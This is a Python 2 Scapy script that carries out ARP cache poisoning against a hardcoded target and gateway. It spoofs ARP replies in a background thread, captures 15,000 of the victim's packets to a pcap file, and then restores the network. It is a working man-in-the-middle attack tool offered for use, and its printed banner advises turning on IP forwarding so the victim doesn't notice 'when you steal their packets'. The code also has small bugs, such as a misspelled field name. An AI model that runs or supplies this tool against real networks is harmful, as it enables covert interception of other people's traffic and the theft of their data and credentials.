#! /usr/bin/env python

from scapy.all import *
import os
import sys
import threading
import signal

# Configuration Variables
interface = "eth0"
target_ip = "10.0.0.79"
gateway_ip = "10.0.0.1"
packet_count = 15000

# Random Variables For Easy Reuse
BROADCAST = "ff:ff:ff:ff:ff:ff"

# set our interface
conf.iface = interface


#turn off output
conf.verb = 0

def get_mac_wrapper(ip, label):
    mac = get_mac(ip)

    if mac is None:
        sys.exit("[!!!] Failed to get " + str(label) + " MAC. Exiting.")
    else:
        print "[ * ] " + str(label) + " %s is at %s" % (ip, mac)
        return mac


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print "[ * ] Restoring Target..."
    send(
        ARP(op=2,
            psrc=gateway_ip,
            pdst=target_ip,
            hwdst=BROADCAST,
            hwsrc=gateway_mac
        ),
        count=5
    )
    send(
        ARP(op=2,
            psrc=target_ip,
            pdst=gateway_ip,
            hwdst=BROADCAST,
            hwsrc=target_mac
        ),
        count=5
    )

    print "[ * ] Restoration ARPs Sent"

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst=BROADCAST)/ARP(pdst=ip_address), timeout=2, retry=10)

    for s,r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = gateway_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdsts = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print "[ * ] Beginning the ARP poison. [CTRL-C to stop]"

    sent = 0
    while True:
        try:
            sent += 1
            print "Sending %d" % sent
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            continue
    print "[ * ] Arp poison attack finished."
    return


##################################### Start of Script #########################
print "[ ? ] Hope you remembered to turn ipv4 forwarding on so the user doesn't"
print "[ ? ] recognize a shitty internet connection when you steal their packets"
print "[ ? ] Hint: sudo sysctl -w net.ipv4.ip_forward=1"
print ""
print "[ * ] Setting up %s" % interface


gateway_mac = get_mac_wrapper(gateway_ip, "Gateway")
target_mac = get_mac_wrapper(target_ip, "Target")

# start poisoning thread
# Will continue to poison until rest of script executes, hence the daemon flag.
poison_thread = threading.Thread(target= poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.daemon = True
poison_thread.start()
print ""
try:
    print "[ * ] Starting sniffer for %d packets" % packet_count
    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter, iface=interface)
    wrpcap("arper.pcap", packets)
    print "[ * ] Done Sniffing for packets"
except KeyboardInterrupt:
    pass
finally:
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
    print "[ * ] Done."